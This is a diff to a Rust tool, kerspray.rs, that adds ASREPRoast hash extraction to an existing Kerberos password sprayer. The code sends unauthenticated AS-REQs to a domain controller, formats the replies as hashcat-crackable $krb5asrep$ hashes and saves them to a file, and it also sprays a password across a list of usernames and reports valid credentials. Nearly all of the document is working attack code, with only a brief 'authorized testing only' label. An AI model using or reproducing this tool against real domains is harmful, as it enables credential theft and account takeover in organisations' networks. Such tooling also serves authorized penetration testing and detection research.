@@ -1,5 +1,6 @@
-// kerspray.rs — Kerberos password spray tool (kerlab)
-// Improved: error handling, safe-mode, delay, named constants, clap hygiene
+// kerspray.rs — Kerberos password spray + ASREPRoast checker
+// ASREPRoast: accounts with DONT_REQUIRE_PREAUTH return an AS-REP without
+// pre-authentication, exposing an offline-crackable hash (hashcat -m 18200).
 
 use clap::{Arg, Command};
 use kerlab::encryption::EncryptionKey;
@@ -7,198 +8,177 @@ use kerlab::krbkdcrep::AsRep;
 use kerlab::krbkdcreq::{AsReq, KdcOptionsType};
 use kerlab::request::{KrbResponse, TcpRequest};
 use std::fs::File;
-use std::io::{self, BufRead};
+use std::io::{self, BufRead, Write};
 use std::thread::sleep;
 use std::time::Duration;
 
 const APPLICATION_NAME: &str = "kerspray";
 
-// Kerberos KDC error codes (RFC 4120 §7.5.9)
-const KRB_ERR_C_PRINCIPAL_UNKNOWN: i32 = 6;  // Username does not exist
-const KRB_AP_ERR_BAD_INTEGRITY: i32 = 24;    // Wrong password (preauth failed)
-const KDC_ERR_CLIENT_REVOKED: i32 = 18;       // Account locked out or disabled
+// RFC 4120 §7.5.9 — KDC error codes
+const KRB_ERR_C_PRINCIPAL_UNKNOWN: i32 = 6;   // Username does not exist
+const KRB_AP_ERR_BAD_INTEGRITY: i32 = 24;      // Wrong password / preauth failed
+const KDC_ERR_CLIENT_REVOKED: i32 = 18;        // Account locked or disabled
+const KDC_ERR_PREAUTH_REQUIRED: i32 = 25;      // Preauth required = NOT asreproastable
 
 fn main() -> Result<(), Box<dyn std::error::Error>> {
     let matches = Command::new(APPLICATION_NAME)
-        .version("0.2.0")
-        .author("Sylvain Peyrefitte <citronneur@gmail.com>")
-        .about("Kerberos password spray — for lab, detection, and authorized testing only")
-        .arg(
-            Arg::new("dc")
-                .long("dc")
-                .value_name("HOST")
-                .required(true)
-                .help("IP or hostname of the Domain Controller"),
-        )
-        .arg(
-            Arg::new("port")
-                .long("port")
-                .value_name("PORT")
-                .default_value("88")
-                .value_parser(clap::value_parser!(u16)) // validated as a number
-                .help("Kerberos port on the Domain Controller"),
-        )
-        .arg(
-            Arg::new("domain")
-                .long("domain")
-                .value_name("DOMAIN")
-                .required(true)
-                .help("Windows domain name (e.g. CORP.LOCAL)"),
-        )
-        .arg(
-            Arg::new("password")
-                .long("password")
-                .value_name("PASSWORD")
-                .required(true)
-                .help("Password to spray against all usernames"),
-        )
-        .arg(
-            Arg::new("file")
-                .long("file")
-                .value_name("FILE")
-                .required(true)
-                .help("File containing one username per line"),
-        )
-        .arg(
-            Arg::new("safe")
-                .long("safe")
-                .action(clap::ArgAction::SetTrue)
-                .help("Stop spraying on first account lockout (KDC error 18)"),
-        )
-        .arg(
-            Arg::new("delay")
-                .long("delay")
-                .value_name("MS")
-                .default_value("0")
-                .value_parser(clap::value_parser!(u64))
-                .help("Milliseconds to wait between each attempt (reduce lockout risk)"),
-        )
-        .arg(
-            Arg::new("pause")
-                .long("pause")
-                .action(clap::ArgAction::SetTrue)
-                .help("Pause and wait for Enter after each successful credential find"),
-        )
+        .version("0.3.0")
+        .about("Kerberos password spray + ASREPRoast — authorized testing only")
+        .arg(Arg::new("dc").long("dc").value_name("HOST").required(true)
+            .help("IP or hostname of the Domain Controller"))
+        .arg(Arg::new("port").long("port").value_name("PORT").default_value("88")
+            .value_parser(clap::value_parser!(u16))
+            .help("Kerberos port on the Domain Controller"))
+        .arg(Arg::new("domain").long("domain").value_name("DOMAIN").required(true)
+            .help("Windows domain name (e.g. CORP.LOCAL)"))
+        .arg(Arg::new("password").long("password").value_name("PASSWORD")
+            // Not required when --asreproast-only is set
+            .help("Password to spray against all usernames"))
+        .arg(Arg::new("file").long("file").value_name("FILE").required(true)
+            .help("File containing one username per line"))
+        .arg(Arg::new("safe").long("safe").action(clap::ArgAction::SetTrue)
+            .help("Stop spraying on first account lockout (KDC error 18)"))
+        .arg(Arg::new("delay").long("delay").value_name("MS").default_value("0")
+            .value_parser(clap::value_parser!(u64))
+            .help("Milliseconds to wait between each attempt"))
+        .arg(Arg::new("pause").long("pause").action(clap::ArgAction::SetTrue)
+            .help("Pause for Enter after each successful credential find"))
+        .arg(Arg::new("asreproast").long("asreproast").action(clap::ArgAction::SetTrue)
+            .help("Also check each account for ASREPRoast vulnerability"))
+        .arg(Arg::new("asreproast-only").long("asreproast-only").action(clap::ArgAction::SetTrue)
+            .help("Only check ASREPRoast, skip password spraying entirely"))
+        .arg(Arg::new("hash-file").long("hash-file").value_name("FILE")
+            .help("Write ASREPRoast hashes to this file (hashcat -m 18200 format)"))
         .get_matches();
 
-    // --- Argument extraction (all validated/required above, safe to unwrap) ---
-    let ip = matches.get_one::<String>("dc").unwrap();
-    let port = matches.get_one::<u16>("port").unwrap();
-    let domain = matches.get_one::<String>("domain").unwrap();
-    let password = matches.get_one::<String>("password").unwrap();
-    let file_path = matches.get_one::<String>("file").unwrap();
-    let safe_mode = matches.get_flag("safe");
-    let pause_on_hit = matches.get_flag("pause");
-    let delay_ms = *matches.get_one::<u64>("delay").unwrap();
+    let ip          = matches.get_one::<String>("dc").unwrap();
+    let port        = matches.get_one::<u16>("port").unwrap();
+    let domain      = matches.get_one::<String>("domain").unwrap();
+    let file_path   = matches.get_one::<String>("file").unwrap();
+    let safe_mode   = matches.get_flag("safe");
+    let pause_on_hit= matches.get_flag("pause");
+    let delay_ms    = *matches.get_one::<u64>("delay").unwrap();
+    let do_asreproast      = matches.get_flag("asreproast") || matches.get_flag("asreproast-only");
+    let asreproast_only    = matches.get_flag("asreproast-only");
+    let hash_file_path     = matches.get_one::<String>("hash-file");
+
+    // Password is required unless --asreproast-only
+    let password = if !asreproast_only {
+        Some(matches.get_one::<String>("password").ok_or(
+            "You must provide --password unless using --asreproast-only"
+        )?)
+    } else {
+        None
+    };
 
     let target = format!("{}:{}", ip, port);
-
-    // Open userlist — surface a clean error rather than a panic
-    let file = File::open(file_path)
-        .map_err(|e| format!("Cannot open '{}': {}", file_path, e))?;
-
     let kdc_options = vec![KdcOptionsType::Renewable, KdcOptionsType::RenewableOk];
 
-    eprintln!(
-        "[*] Spraying '{}' against {} users via {} (safe={}, delay={}ms)",
-        password,
-        // Count lines for user info without consuming the reader
-        io::BufReader::new(File::open(file_path)?).lines().count(),
-        target,
-        safe_mode,
-        delay_ms,
-    );
+    // Optional hash output file
+    let mut hash_writer: Option<Box<dyn Write>> = match hash_file_path {
+        Some(path) => Some(Box::new(
+            File::create(path).map_err(|e| format!("Cannot create hash file '{}': {}", path, e))?
+        )),
+        None => None,
+    };
 
-    // Re-open after counting
     let file = File::open(file_path)
-        .map_err(|e| format!("Cannot reopen '{}': {}", file_path, e))?;
+        .map_err(|e| format!("Cannot open '{}': {}", file_path, e))?;
 
     for (i, line) in io::BufReader::new(file).lines().enumerate() {
         let username = match line {
             Ok(u) if !u.trim().is_empty() => u.trim().to_string(),
-            Ok(_) => continue, // skip blank lines
-            Err(e) => {
-                eprintln!("[!] Error reading line {}: {}", i + 1, e);
-                continue;
-            }
+            Ok(_) => continue,
+            Err(e) => { eprintln!("[!] Line {} read error: {}", i + 1, e); continue; }
         };
 
-        // Throttle between attempts to reduce lockout risk
-        if delay_ms > 0 {
-            sleep(Duration::from_millis(delay_ms));
+        if delay_ms > 0 { sleep(Duration::from_millis(delay_ms)); }
+
+        // ----------------------------------------------------------------
+        // PHASE 1 — ASREPRoast check (AS-REQ without pre-authentication)
+        // ----------------------------------------------------------------
+        if do_asreproast {
+            let asrep_request = match AsReq::new(domain, &username, &kdc_options) {
+                Ok(r) => r,
+                Err(e) => { eprintln!("[!] AS-REQ build failed for '{}': {:?}", username, e); continue; }
+            };
+            // NOTE: intentionally NO .with_preauth() call here.
+            // A KDC that returns AS-REP anyway exposes an offline-crackable blob.
+
+            match TcpRequest::ask_for::<AsRep, String>(&asrep_request, target.clone()) {
+                Ok(KrbResponse::Response(asrep)) => {
+                    // Account has DONT_REQUIRE_PREAUTH — extract the crackable hash.
+                    // The enc_part is split: first 16 bytes = checksum, rest = edata.
+                    // Hashcat mode 18200 format:
+                    //   $krb5asrep$23$user@DOMAIN:CHECKSUM$EDATA
+                    let enc_bytes = &asrep.inner.enc_part.inner.cipher.inner;
+                    let (checksum, edata) = enc_bytes.split_at(16.min(enc_bytes.len()));
+
+                    let hash = format!(
+                        "$krb5asrep$23${}@{}:{}${}",
+                        username,
+                        domain,
+                        hex::encode(checksum),
+                        hex::encode(edata),
+                    );
+
+                    println!("[ASREPROAST] {}\\{} is vulnerable!", domain, username);
+                    println!("  {}", hash);
+
+                    if let Some(ref mut w) = hash_writer {
+                        writeln!(w, "{}", hash)?;
+                    }
+                }
+                Ok(KrbResponse::Error(e)) => {
+                    match e.inner.error_code.inner {
+                        KRB_ERR_C_PRINCIPAL_UNKNOWN  => { /* will also show in spray phase */ }
+                        KDC_ERR_PREAUTH_REQUIRED     => println!("[asreproast] {}\\{} requires preauth — not vulnerable", domain, username),
+                        other => eprintln!("[asreproast] {}\\{} unexpected error {}", domain, username, other),
+                    }
+                }
+                Err(e) => eprintln!("[!] ASREPRoast network error for '{}': {:?}", username, e),
+            }
         }
 
-        // Build AS-REQ
-        let tgt_request = match AsReq::new(domain, username.as_str(), &kdc_options) {
-            Ok(req) => req,
-            Err(e) => {
-                eprintln!("[!] Failed to build AS-REQ for '{}': {:?}", username, e);
-                continue;
-            }
-        };
+        // ----------------------------------------------------------------
+        // PHASE 2 — Password spray (AS-REQ with pre-authentication)
+        // ----------------------------------------------------------------
+        if asreproast_only { continue; }
 
-        let tgt_request = match tgt_request
-            .with_preauth(&EncryptionKey::new_rc4_hmac(password).unwrap())
+        let password = password.unwrap(); // safe: checked at startup
+
+        let tgt_request = match AsReq::new(domain, &username, &kdc_options)
+            .and_then(|r| r.with_preauth(&EncryptionKey::new_rc4_hmac(password).unwrap()))
         {
-            Ok(req) => req,
-            Err(e) => {
-                eprintln!("[!] Failed to attach preauth for '{}': {:?}", username, e);
-                continue;
-            }
+            Ok(r) => r,
+            Err(e) => { eprintln!("[!] AS-REQ build failed for '{}': {:?}", username, e); continue; }
         };
 
-        // Send request; skip user on network/parse failure rather than crashing
-        let tgt_response =
-            match TcpRequest::ask_for::<AsRep, String>(&tgt_request, target.clone()) {
-                Ok(r) => r,
-                Err(e) => {
-                    eprintln!("[!] Network/parse error for '{}': {:?}", username, e);
-                    continue;
-                }
-            };
-
-        match tgt_response {
-            KrbResponse::Error(e) => {
-                let code = e.inner.error_code.inner;
-                match code {
-                    KRB_ERR_C_PRINCIPAL_UNKNOWN => {
-                        println!("[-] Not found:    {}\\{}", domain, username)
-                    }
-                    KRB_AP_ERR_BAD_INTEGRITY => {
-                        println!("[-] Wrong password: {}\\{}", domain, username)
-                    }
-                    KDC_ERR_CLIENT_REVOKED => {
-                        println!(
-                            "[!] LOCKED/DISABLED: {}\\{} (error {})",
-                            domain, username, code
-                        );
-                        // --safe: abort the entire spray to avoid further lockouts
+        match TcpRequest::ask_for::<AsRep, String>(&tgt_request, target.clone()) {
+            Ok(KrbResponse::Error(e)) => {
+                match e.inner.error_code.inner {
+                    KRB_ERR_C_PRINCIPAL_UNKNOWN  => println!("[-] Not found:      {}\\{}", domain, username),
+                    KRB_AP_ERR_BAD_INTEGRITY     => println!("[-] Wrong password: {}\\{}", domain, username),
+                    KDC_ERR_CLIENT_REVOKED       => {
+                        println!("[!] LOCKED/DISABLED: {}\\{}", domain, username);
                         if safe_mode {
-                            eprintln!("[!] Safe mode: stopping spray to prevent further lockouts.");
+                            eprintln!("[!] Safe mode active — aborting spray.");
                             return Ok(());
                         }
                     }
-                    _ => println!(
-                        "[?] Unknown error {}: {}\\{}",
-                        code, domain, username
-                    ),
+                    other => println!("[?] Error {}: {}\\{}", other, domain, username),
                 }
             }
-
-            KrbResponse::Response(_) => {
+            Ok(KrbResponse::Response(_)) => {
                 println!("*******************************************");
                 println!("[+] VALID: {}\\{} : {}", domain, username, password);
                 println!("*******************************************");
-
-                // --pause: wait for operator acknowledgement before continuing
                 if pause_on_hit {
                     eprintln!("[*] Press Enter to continue...");
-                    let mut buf = String::new();
-                    io::stdin()
-                        .read_line(&mut buf)
-                        .expect("Failed to read stdin");
+                    io::stdin().read_line(&mut String::new())?;
                 }
             }
+            Err(e) => eprintln!("[!] Network error for '{}': {:?}", username, e),
         }
     }
 
